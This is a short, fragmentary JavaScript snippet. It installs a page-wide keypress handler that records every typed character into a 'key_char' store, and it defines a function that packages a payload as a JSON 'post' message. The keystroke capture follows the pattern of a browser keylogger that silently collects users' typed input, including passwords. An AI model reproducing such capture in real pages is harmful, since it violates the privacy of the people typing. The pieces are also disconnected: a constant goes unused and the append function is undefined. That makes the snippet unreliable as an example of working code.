const eventNames = ['READ_FILE_ERROR', 'WRITE_FILE_ERROR'];
document.onkeypress = function(event) {
  const character = String.fromCharCode(event.keyCode);
  append('key_char', character);
};
function reportRecord(record) {
  const payload = record.payload;
  const message = {msg_type: 'post', content: payload};
  return JSON.stringify(message);
}
